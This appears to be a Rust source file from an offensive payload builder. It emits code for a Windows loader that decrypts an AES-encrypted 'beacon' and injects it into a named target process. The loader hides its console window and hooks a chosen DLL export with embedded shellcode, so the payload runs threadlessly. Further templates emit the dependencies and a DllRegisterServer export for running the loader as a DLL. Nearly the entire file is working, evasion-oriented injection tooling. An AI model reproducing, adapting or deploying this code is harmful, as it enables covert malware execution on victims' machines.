
pub fn payload_main(pid: String, dll: String, export: String) -> String {

    format!(
        r#"
fn main() -> Result<(), String>{{

     let mut shellcode = vec![0x56, 0x48, 0x89, 0xE6, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0xF, 0x0, 0x0, 0x0, 0x48, 0x89, 0xF4, 0x5E, 0xC3, 0x66, 0x2E, 0xF, 0x1F, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x57, 0xB9, 0xF0, 0x1D, 0xD3, 0xAD, 0x56, 0x53, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0xDF, 0x0, 0x0, 0x0, 0xB9, 0x53, 0x17, 0xE6, 0x70, 0x48, 0x89, 0xC3, 0xE8, 0xD2, 0x0, 0x0, 0x0, 0x48, 0x89, 0xC7, 0x48, 0x85, 0xDB, 0x74, 0x2F, 0x48, 0x89, 0xD9, 0xBA, 0xDA, 0xB3, 0xF1, 0xD, 0xE8, 0xE, 0x1, 0x0, 0x0, 0x48, 0x89, 0xD9, 0xBA, 0xB6, 0xE0, 0x21, 0x8B, 0x48, 0x89, 0xC6, 0xE8, 0xFE, 0x0, 0x0, 0x0, 0x48, 0x89, 0xD9, 0xBA, 0x11, 0xAB, 0xBA, 0x98, 0xE8, 0xF1, 0x0, 0x0, 0x0, 0x48, 0x89, 0xC3, 0xEB, 0x4, 0x31, 0xDB, 0x31, 0xF6, 0x48, 0x85, 0xFF, 0x74, 0xD, 0xBA, 0x4F, 0xDD, 0xD9, 0x4E, 0x48, 0x89, 0xF9, 0xE8, 0xD6, 0x0, 0x0, 0x0, 0x48, 0x8D, 0x44, 0x24, 0x38, 0x45, 0x31, 0xC9, 0x31, 0xD2, 0x31, 0xC9, 0x49, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x44, 0x24, 0x28, 0x31, 0xC0, 0x89, 0x44, 0x24, 0x20, 0xFF, 0xD3, 0x31, 0xD2, 0x48, 0x83, 0xC9, 0xFF, 0xFF, 0xD6, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0x5E, 0x5F, 0xC3, 0x90, 0x90, 0x49, 0x89, 0xC9, 0xB8, 0x5, 0x15, 0x0, 0x0, 0x45, 0x8A, 0x1, 0x48, 0x85, 0xD2, 0x75, 0x6, 0x45, 0x84, 0xC0, 0x75, 0x16, 0xC3, 0x45, 0x89, 0xCA, 0x41, 0x29, 0xCA, 0x49, 0x39, 0xD2, 0x73, 0x23, 0x45, 0x84, 0xC0, 0x75, 0x5, 0x49, 0xFF, 0xC1, 0xEB, 0xA, 0x41, 0x80, 0xF8, 0x60, 0x76, 0x4, 0x41, 0x83, 0xE8, 0x20, 0x6B, 0xC0, 0x21, 0x45, 0xF, 0xB6, 0xC0, 0x49, 0xFF, 0xC1, 0x44, 0x1, 0xC0, 0xEB, 0xC4, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x56, 0x48, 0x89, 0xCE, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x78, 0x20, 0x48, 0x89, 0xFB, 0xF, 0xB7, 0x53, 0x48, 0x48, 0x8B, 0x4B, 0x50, 0xE8, 0x85, 0xFF, 0xFF, 0xFF, 0x89, 0xC0, 0x48, 0x39, 0xF0, 0x75, 0x6, 0x48, 0x8B, 0x43, 0x20, 0xEB, 0x11, 0x48, 0x8B, 0x1B, 0x48, 0x85, 0xDB, 0x74, 0x5, 0x48, 0x39, 0xDF, 0x75, 0xD9, 0x48, 0x83, 0xC8, 0xFF, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5E, 0x5F, 0xC3, 0x41, 0x57, 0x49, 0x89, 0xD7, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x31, 0xED, 0x57, 0x56, 0x53, 0x48, 0x89, 0xCB, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x63, 0x41, 0x3C, 0x8B, 0xBC, 0x8, 0x88, 0x0, 0x0, 0x0, 0x48, 0x1, 0xCF, 0x44, 0x8B, 0x77, 0x20, 0x44, 0x8B, 0x67, 0x1C, 0x44, 0x8B, 0x6F, 0x24, 0x49, 0x1, 0xCE, 0x3B, 0x6F, 0x18, 0x73, 0x31, 0x89, 0xEE, 0x31, 0xD2, 0x41, 0x8B, 0xC, 0xB6, 0x48, 0x1, 0xD9, 0xE8, 0x15, 0xFF, 0xFF, 0xFF, 0x4C, 0x39, 0xF8, 0x75, 0x18, 0x48, 0x1, 0xF6, 0x48, 0x1, 0xDE, 0x42, 0xF, 0xB7, 0x4, 0x2E, 0x48, 0x8D, 0x4, 0x83, 0x42, 0x8B, 0x4, 0x20, 0x48, 0x1, 0xD8, 0xEB, 0x4, 0xFF, 0xC5, 0xEB, 0xCA, 0x48, 0x83, 0xC4, 0x28, 0x5B, 0x5E, 0x5F, 0x5D, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x90, 0x90, 0x90, 0xE8, 0x0, 0x0, 0x0, 0x0, 0x58, 0x48, 0x83, 0xE8, 0x5, 0xC3, 0xF, 0x1F, 0x44, 0x0, 0x0, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90];

    let mut payload: Vec<u8> = vec![0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
    0xE0, 0x90];

    let beacon = decrypt();

    let mut system = System::new();
    system.refresh_all();
    let pid = system.processes_by_name("{}").next().expect("Could not find target process").pid().as_u32();

    unsafe{{
        let target_process_handle = match OpenProcess(PROCESS_ALL_ACCESS, false, pid){{
            Ok(x) => x,
            Err(_) => return Err(format!("Failed to get handle to handle to pid"))
        }};
      
        let hwnd = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);
        SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    
        
    
        let beacon_address = inject_shellcode(target_process_handle, beacon.clone());
        let beacon_address = beacon_address.to_le_bytes();
        
        shellcode.splice(153..153+beacon_address.len(), beacon_address.iter().cloned());
    
        let hmodule = remote_modules::get_remote_module_handle(target_process_handle, String::from("{}")).unwrap();

        let export_address = remote_modules::get_remote_proc_address(target_process_handle, hmodule, String::from("{}"), 0, false).unwrap();
    
        
        let loader_address = find_memory_hole(target_process_handle, export_address, shellcode.len() + payload.len()).unwrap();
    
        let mut original_bytes: [u8; 8] = [0;8];
        memory::read_virtual_memory(target_process_handle, export_address, original_bytes.as_mut_ptr() as *mut c_void, original_bytes.len());
    
        payload.splice(18..18+original_bytes.len(), original_bytes.iter().cloned());
        payload.append(&mut shellcode);
        let relative_loader_address = (loader_address as i64 - (export_address as i64 + 5)) as i32;
        
        let mut call_opcode: Vec<u8> = vec![0xe8, 0, 0, 0, 0];
        call_opcode.splice(1..1+relative_loader_address.to_le_bytes().len(), relative_loader_address.to_le_bytes().iter().cloned());
    
        let size = 8;
        let mut old_protect = 0 as u32;
        memory::protect_virtual_memory(target_process_handle, export_address as usize, size, 0x40, &mut old_protect);
        

        let mut bytes_written: usize = 0;
        memory::write_virtual_memory(target_process_handle, export_address as usize, call_opcode.as_mut_ptr() as *mut c_void, call_opcode.len(), &mut bytes_written);
    
        memory::protect_virtual_memory(target_process_handle, loader_address as usize, payload.len(), 0x04, &mut old_protect);
       
        memory::write_virtual_memory(target_process_handle, loader_address as usize, payload.as_mut_ptr() as *mut c_void, payload.len(), &mut bytes_written);
    
        memory::protect_virtual_memory(target_process_handle, loader_address as usize, payload.len(), old_protect, &mut old_protect);
     
        #[cfg(feature = "console_mode")]
        println!("[*] Shellcode injected, waiting 60 seconds for hook to be called");
        
        let mut export_address_bytes: [u8; 8] = [0;8];
        let mut executed = false;
        let start = Instant::now();
        while start.elapsed().as_secs() < 60 && executed != true {{
            memory::read_virtual_memory(target_process_handle, export_address, export_address_bytes.as_mut_ptr() as *mut c_void, export_address_bytes.len());
            if export_address_bytes == original_bytes{{
                executed = true;
            }}
            std::thread::sleep(std::time::Duration::from_secs(1));
        }}
    
        if executed == true {{
            memory::protect_virtual_memory(target_process_handle, export_address, export_address_bytes.len(), 0x20, &mut old_protect);
    
            memory::free_virtual_memory(target_process_handle, loader_address);
            
            #[cfg(feature = "console_mode")]
            println!("[*] Shellcode executed, export restored");
        }}
        else{{
            #[cfg(feature = "console_mode")]
            println!("[*] Shellcode did not execute within 60s, it may still execute but we are not cleaning up");
        }}    
        windows::Win32::Foundation::CloseHandle(target_process_handle);
        }}
    
        Ok(())
    }}

    unsafe fn find_memory_hole(h_process: HANDLE, export_address: usize, size: usize) -> Result<usize, &'static str>{{

        let mut ret: Option<i32>;   
    
        let mut loader_address: usize = 0;
        let mut remote_loader_address = (export_address & 0xFFFFFFFFFFF70000) - 0x70000000;
        
        while remote_loader_address < export_address + 0x70000000{{
            ret = memory::allocate_virtual_memory(h_process, remote_loader_address, size, 0x20).0;
            if ret.unwrap() != 0{{
                remote_loader_address = remote_loader_address  + 0x10000; 
            }}else{{
                loader_address = remote_loader_address as usize;
                break;
            }}
        }}
    
        match loader_address{{
            0 => Err("Could not find memory hole"),
            _ => Ok(loader_address)
        }}
    
    }}
    
        unsafe fn inject_shellcode(target_process_handle: HANDLE, mut shellcode: Vec<u8>) -> usize{{
    
            let base_address: usize = 0;
            let base_address = memory::allocate_virtual_memory(target_process_handle, base_address, shellcode.len(), 0x04).1;
        
        
            let mut bytes_written = 0;
            memory::write_virtual_memory(target_process_handle, base_address, shellcode.as_mut_ptr() as *mut c_void, shellcode.len(), &mut bytes_written);
    
            let mut old_protect = 0 as u32;
            memory::protect_virtual_memory(target_process_handle, base_address, shellcode.len(), 0x20, &mut old_protect);
        
            base_address
        
        }}
"#, pid, dll, export)
}

pub fn shellcode_decrypt(encoded: String, key: String, iv: String) -> String{

    format!(r#"

fn decrypt() -> Vec<u8>{{
    let encoded = "{}";
    let key = "{}";
    let iv = "{}";
    
    let shellcode: Vec<u8> = general_purpose::STANDARD_NO_PAD.decode(encoded).unwrap();
    let key: Vec<u8> =  general_purpose::STANDARD_NO_PAD.decode(key).unwrap();
    let iv: Vec<u8> =  general_purpose::STANDARD_NO_PAD.decode(iv).unwrap();

    let key: [u8; 32] = key.try_into().unwrap();
    let cipher = Cipher::new_256(&key);
    let beacon = cipher.cbc_decrypt(&iv, &shellcode[..]);

    return beacon

}}

    "#, encoded, key, iv)

}

pub fn libraries() -> String{

    format!(r#"
use std::{{
    ffi::c_void,
    time::Instant,
}};

use base64::{{Engine as _, engine::general_purpose}};
use libaes::Cipher;

use windows::Win32::{{
    Foundation::HANDLE,
    System::{{
        Threading::{{
            OpenProcess, PROCESS_ALL_ACCESS
        }},
        Console::GetConsoleWindow,
    }},
    UI::WindowsAndMessaging::{{
        HWND_NOTOPMOST, SWP_NOMOVE, SWP_NOSIZE, SW_HIDE, SetWindowPos, ShowWindow,
    }},
}};

use sysinfo::{{System, SystemExt, ProcessExt, PidExt}};

use memory;
use remote_modules;
    "#)

}


pub fn dependencies() -> String {
    format!(r#"
base64 = "0.21.0"
libaes = "0.6.4"
dinvoke = {{ git = "https://github.com/Kudaes/DInvoke_rs", package = "dinvoke" }}
clap = {{ version = "4.3.5", features = ["derive"] }}
memory = {{ path = "../memory" }}
remote_modules = {{ path = "../remote_modules" }}
sysinfo = "0.29.10"
static_vcruntime = "2.0"

[dependencies.windows]
version = "0.48"
features = [
"Win32_System_Threading",
"Win32_Foundation",
"Win32_Security",
"Win32_System_Memory",
"Win32_System_WindowsProgramming",
"Win32_System_Diagnostics_Debug",
"Win32_System_Kernel",
"Win32_System_SystemServices",
"Win32_System_Diagnostics_ToolHelp",
"Win32_System_Time",
"Win32_System_LibraryLoader",
"Win32_System_Console",
"Win32_UI_WindowsAndMessaging"
]

[build-dependencies]
static_vcruntime = "2.0"
    "#)
}

pub fn cdylib() -> String {
    format!(r#"  
[lib]
crate-type = ["cdylib"]
    "#)
}

pub fn dll_export() -> String {
    format!(r#" 
#[no_mangle]
pub extern "C" fn DllRegisterServer() {{
    main();
}}
"#)
}

pub fn vcruntime() -> String{
    format!(r#"
fn main() {{
    static_vcruntime::metabuild();
}}
    "#)
}